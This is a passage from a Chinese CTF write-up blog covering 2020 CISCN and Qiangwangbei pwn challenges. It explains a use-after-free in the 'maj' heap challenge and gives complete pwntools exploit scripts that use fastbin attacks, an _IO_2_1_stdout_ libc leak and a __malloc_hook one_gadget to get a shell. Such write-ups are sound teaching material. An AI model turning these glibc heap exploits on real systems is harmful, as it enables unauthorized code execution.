class="comment"># Overflow to write chunk 1 size make chunk 1 to merge chunk 2</span></span><br><span class="line">	rm(<span class="number">0</span>)</span><br><span class="line">	ad(<span class="number">0</span>, <span class="number">0x68</span>, <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x68</span> + p8(<span class="number">0xe1</span>))</span><br><span class="line"></span><br><span class="line">	rm(<span class="number">1</span>) <span class="comment"># free as small bin</span></span><br><span class="line">	rm(<span class="number">2</span>) <span class="comment"># for fastbin attack</span></span><br><span class="line"></span><br><span class="line">	ad(<span class="number">4</span>, <span class="number">0x28</span>, <span class="string">&#x27;\x11&#x27;</span> * <span class="number">0x28</span>)</span><br><span class="line">	ad(<span class="number">5</span>, <span class="number">0x38</span>, <span class="string">&#x27;\x22&#x27;</span> * <span class="number">0x38</span>)</span><br><span class="line">	ad(<span class="number">6</span>, <span class="number">0x10</span>, <span class="string">&#x27;\xdd\x25&#x27;</span>)</span><br><span class="line">	<span class="comment"># recovery size</span></span><br><span class="line">	rm(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">	ad(<span class="number">5</span>, <span class="number">0x38</span>, <span class="string">&#x27;\x22&#x27;</span> * <span class="number">0x38</span> + p8(<span class="number">0x71</span>))</span><br><span class="line">	ad(<span class="number">7</span>, <span class="number">0x68</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">	p = <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x33</span> + p64(<span class="number">0xfbad3c80</span>) + <span class="number">3</span> * p64(<span class="number">0</span>) + p8(<span class="number">0</span>)</span><br><span class="line">	ad(<span class="number">8</span>, <span class="number">0x68</span>, p)</span><br><span class="line">	libc_base = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-5</span>:] + <span class="string">&#x27;\x7f\x00\x00&#x27;</span>)</span><br><span class="line">	libc_base -= lib.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>] + <span class="number">192</span></span><br><span class="line">	lib.address = libc_base</span><br><span class="line">	main_arena = libc_base + <span class="number">0x3c4b20</span></span><br><span class="line">	li(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">	rm(<span class="number">7</span>) <span class="comment"># for fastbin attack to main_arena - 0x33</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># recovery size as 0x21</span></span><br><span class="line">	rm(<span class="number">5</span>)</span><br><span class="line">	ad(<span class="number">5</span>, <span class="number">0x38</span>, <span class="string">&#x27;\x22&#x27;</span> * <span class="number">0x38</span> + p8(<span class="number">0x21</span>))</span><br><span class="line">	rm(<span class="number">6</span>)</span><br><span class="line">	<span class="comment"># modify fastbin list</span></span><br><span class="line">	ad(<span class="number">6</span>, <span class="number">0x10</span>, p64(main_arena - <span class="number">0x33</span>))</span><br><span class="line">	</span><br><span class="line">	<span class="comment"># recovery size as 0x71</span></span><br><span class="line">	rm(<span class="number">5</span>)</span><br><span class="line">	ad(<span class="number">0</span>, <span class="number">0x38</span>, <span class="string">&#x27;\x22&#x27;</span> * <span class="number">0x38</span> + p8(<span class="number">0x71</span>))</span><br><span class="line">	ad(<span class="number">9</span>, <span class="number">0x68</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># for ajust</span></span><br><span class="line">	<span class="comment"># attack to main_arena - 0x33</span></span><br><span class="line">	realloc = lib.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">	gadgets = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>, <span class="number">0xcd0f3</span>, <span class="number">0xcd1c8</span>]</span><br><span class="line">	one_gadget = lib.address + gadgets[<span class="number">2</span>]</span><br><span class="line">	p = <span class="string">&#x27;\xAA&#x27;</span> * (<span class="number">0x13</span> - <span class="number">0x8</span>) + p64(one_gadget) + p64(realloc + <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">	ad(<span class="number">10</span>, <span class="number">0x68</span>, p)</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">11</span>));</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			<span class="keyword">if</span> LOCAL:</span><br><span class="line">				exe = ELF(exeFile)</span><br><span class="line">				<span class="keyword">if</span> LIB:</span><br><span class="line">					lib = ELF(libFile)</span><br><span class="line">					io = exe.process(env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : libFile&#125;)</span><br><span class="line">				<span class="keyword">else</span>:</span><br><span class="line">					io = exe.process()</span><br><span class="line"></span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				exe = ELF(exeFile)</span><br><span class="line">				io = remote(remoteIp, remotePort)</span><br><span class="line">				<span class="keyword">if</span> LIB:</span><br><span class="line">					lib = ELF(libFile)</span><br><span class="line">			exploit()</span><br><span class="line">			finish()</span><br><span class="line">		<span class="keyword">except</span>:</span><br><span class="line">			c()</span><br><span class="line">	</span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br></pre></td></tr></table></figure>



<h2 id="4-maj"><a href="#4-maj" class="headerlink" title="4-maj"></a>4-maj</h2><h3 id="难度-3"><a href="#难度-3" class="headerlink" title="难度"></a>难度</h3><p>5/ 10</p>
<h3 id="保护-2"><a href="#保护-2" class="headerlink" title="保护"></a>保护</h3> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3ff000)</span><br></pre></td></tr></table></figure>

<h3 id="简单描述-3"><a href="#简单描述-3" class="headerlink" title="简单描述"></a>简单描述</h3><p>以前在v&amp;n面试中, 有位师傅面过我这类型的, 基本思路也差不多, 经典的heap题, 有花指令影响逆向分析, 简单的添加功能,而添加功能所输入的字符临时储存在全局变量区中, 只有编辑功能才对堆区写入数据,还有删除功能, 打印功能没有。</p>
<h3 id="vul-3"><a href="#vul-3" class="headerlink" title="vul"></a>vul</h3><p>在删除功能中, free后指针没有清0</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  sub_400846(dword_603010, dword_60303C + <span class="number">1</span>, dword_603040);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">free</span>(p_addr[v3]);                           <span class="comment">// vul : not set ptr as null</span></span><br><span class="line"><span class="keyword">if</span> ( dword_60303C / dword_603010 &gt; <span class="number">1</span> )</span><br></pre></td></tr></table></figure>



<h3 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h3><p>uaf, fastbin attack, IO file attack</p>
<h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>使用fastbin attack 打入_IO_2_1_stdout中泄漏libc, 然后再使用fastbin attack 此打入malloc_hook - 0x23处打one_gadget, realloc调整execve参数</p>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># author: i0gan</span></span><br><span class="line"><span class="comment"># env: pwndocker [skysider/pwndocker (v: 2020/09/09)]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf_path  = <span class="string">&#x27;maj&#x27;</span></span><br><span class="line">MODIFY_LD = <span class="number">0</span></span><br><span class="line">arch = <span class="string">&#x27;64&#x27;</span></span><br><span class="line">libc_v = <span class="string">&#x27;2.23&#x27;</span></span><br><span class="line"></span><br><span class="line">ld_path   = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib/ld-linux-x86-64.so.2&#x27;</span></span><br><span class="line">libs_path = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib/libc.so.6&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># change ld path </span></span><br><span class="line"><span class="keyword">if</span>(MODIFY_LD):</span><br><span class="line">	os.system(<span class="string">&#x27;cp &#x27;</span> + elf_path + <span class="string">&#x27; &#x27;</span> + elf_path + <span class="string">&#x27;.bk&#x27;</span>)</span><br><span class="line">	change_ld_cmd = <span class="string">&#x27;patchelf  --set-interpreter &#x27;</span> + ld_path +<span class="string">&#x27; &#x27;</span> + elf_path</span><br><span class="line">	os.system(change_ld_cmd)</span><br><span class="line">	li(<span class="string">&#x27;modify ld ok!&#x27;</span>)</span><br><span class="line">	exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># remote server ip and port</span></span><br><span class="line">server_ip = <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">server_port = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if local debug</span></span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line">LIBC  = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">	<span class="keyword">if</span>(LOCAL):</span><br><span class="line">		gdb.attach(io)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ad</span>(<span class="params">s, d</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;question&#x27;</span>, <span class="string">&#x27;80&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">str</span>(s))</span><br><span class="line">	sa(<span class="string">&#x27;?&#x27;</span>, d)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span>(<span class="params">i</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md</span>(<span class="params">i, d</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">str</span>(i))</span><br><span class="line">	sa(<span class="string">&#x27;?&#x27;</span>, d)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	li(<span class="string">&#x27;exploit...&#x27;</span>)</span><br><span class="line">	ad(<span class="number">0x20</span>, <span class="string">&#x27;A&#x27;</span> * <span class="number">0x10</span>) <span class="comment"># fastbin attack unsorted bin - 0x10</span></span><br><span class="line">	ad(<span class="number">0x60</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># fake chunk</span></span><br><span class="line">	ad(<span class="number">0x80</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># partial write fastbin attack to _IO_2_1_stderr + 157</span></span><br><span class="line">	ad(<span class="number">0x20</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># fastbin attack to unsorted bin - 0x10</span></span><br><span class="line">	ad(<span class="number">0x60</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># idx 4 modify chunk 2 connect fastbin then attack to _IO_2_1_stdout</span></span><br><span class="line">	<span class="comment"># for fastbin attack to _free_hook</span></span><br><span class="line">	ad(<span class="number">0x60</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># idx 5 fa to malloc_hook - 0x23</span></span><br><span class="line">	ad(<span class="number">0x60</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># idx 6 </span></span><br><span class="line">	</span><br><span class="line">	<span class="comment"># create fastbin attack</span></span><br><span class="line">	rm(<span class="number">3</span>)</span><br><span class="line">	rm(<span class="number">0</span>)</span><br><span class="line">	rm(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># free chunk2 make fd value as main_arena + 0x58</span></span><br><span class="line">	rm(<span class="number">2</span>)</span><br><span class="line">	ad(<span class="number">0x20</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># 7</span></span><br><span class="line">	md(<span class="number">7</span>, <span class="string">&#x27;\x90&#x27;</span>)</span><br><span class="line">	ad(<span class="number">0x20</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># 8</span></span><br><span class="line">	ad(<span class="number">0x20</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># 9</span></span><br><span class="line">	md(<span class="number">1</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>))</span><br><span class="line">	ad(<span class="number">0x20</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># 10</span></span><br><span class="line">	</span><br><span class="line">	md(<span class="number">10</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + <span class="string">b&#x27;\xdd\x25&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	rm(<span class="number">4</span>)</span><br><span class="line">	rm(<span class="number">1</span>)</span><br><span class="line">	rm(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># attack to _IO_2_1_stderr + 157</span></span><br><span class="line">	ad(<span class="number">0x60</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># 11</span></span><br><span class="line">	md(<span class="number">11</span>, <span class="string">&#x27;\xa0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	ad(<span class="number">0x60</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># 12</span></span><br><span class="line">	ad(<span class="number">0x60</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># 13</span></span><br><span class="line">	ad(<span class="number">0x60</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># 14</span></span><br><span class="line">	ad(<span class="number">0x60</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># 15</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># leak libc</span></span><br><span class="line">	p = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x33</span></span><br><span class="line">	p += p64(<span class="number">0xfbad3c80</span>)</span><br><span class="line">	p += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">	p += p8(<span class="number">8</span>)</span><br><span class="line">	md(<span class="number">15</span>, p)</span><br><span class="line">	</span><br><span class="line">	leak = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-5</span>:] + <span class="string">b&#x27;\x7f\x00\x00&#x27;</span>)</span><br><span class="line">	libc_base = leak - (<span class="number">0x7ffff7fc2608</span> - <span class="number">0x7ffff7c26000</span>)</span><br><span class="line">	libc_base = leak - (<span class="number">0x7ffff7dd2608</span> - <span class="number">0x7ffff7a0d000</span>) <span class="comment"># origin libc 2.23 ubuntu16</span></span><br><span class="line">	libc.address = libc_base</span><br><span class="line">	<span class="comment">#main_arena = libc_base + 0x39bb20</span></span><br><span class="line"></span><br><span class="line">	one_gadget = libc_base + <span class="number">0x3f42a</span></span><br><span class="line">	one_gadget = libc_base + <span class="number">0xf0364</span> <span class="comment"># original libc 2.23 ubuntu16</span></span><br><span class="line"></span><br><span class="line">	li(<span class="string">&#x27;leak: &#x27;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">	li(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">	</span><br><span class="line">	<span class="comment"># fastbin attack to malloc_hook - 0x23</span></span><br><span class="line">	rm(<span class="number">5</span>)</span><br><span class="line">	rm(<span class="number">6</span>)</span><br><span class="line">	rm(<span class="number">5</span>)</span><br><span class="line">	ad(<span class="number">0x60</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># 16</span></span><br><span class="line">	p = p64(libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x23</span>)</span><br><span class="line">	md(<span class="number">16</span>, p)</span><br><span class="line">	ad(<span class="number">0x60</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># 17</span></span><br><span class="line">	ad(<span class="number">0x60</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># 18</span></span><br><span class="line">	ad(<span class="number">0x60</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># 19</span></span><br><span class="line">	p = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x13</span> - <span class="number">0x8</span>)</span><br><span class="line">	p += p64(one_gadget)</span><br><span class="line">	p += p64(libc.sym[<span class="string">&#x27;realloc&#x27;</span>] + <span class="number">8</span>)</span><br><span class="line">	md(<span class="number">19</span>, p)</span><br><span class="line">	<span class="comment"># get shell</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;question&#x27;</span>, <span class="string">&#x27;80&#x27;</span>)</span><br><span class="line">	<span class="comment">#db()</span></span><br><span class="line">	sla(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">str</span>(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line">			io = elf.process(env = &#123;<span class="string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path, <span class="string">&quot;LD_PRELOAD&quot;</span> : libc_path&#125; )</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = elf.process(env = &#123;<span class="string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path&#125;)</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		io = remote(server_ip, server_port)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br><span class="line"></span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/09/02/wp-2020-ciscn/" data-id="ckhemv81l0027wdcma0gp53pu" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-wp-2020-qwb" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/09/01/wp-2020-qwb/" class="article-date">
  <time datetime="2020-09-01T09:58:07.000Z" itemprop="datePublished">2020-09-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/09/01/wp-2020-qwb/">wp 2020强网杯</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="2020-强网杯-PWN-WP"><a href="#2020-强网杯-PWN-WP" class="headerlink" title="2020 强网杯 PWN WP"></a>2020 强网杯 PWN WP</h1><p>当时做, 做了四道题, wp先贴在这里 </p>
<p>源题下载: <a target="_blank" rel="noopener" href="https://github.com/I0gan/pwn/tree/master/matchs/2020_08_qwb">https://github.com/I0gan/pwn/tree/master/matchs/2020_08_qwb</a></p>
<h2 id="1-babymessage"><a href="#1-babymessage" class="headerlink" title="1-babymessage"></a>1-babymessage</h2><p>漏洞 (可以修改rbp 的值) 堆栈迁移使 [rbp - 4 ]&gt; 0x100( mm ), 即可实现堆栈溢出</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: 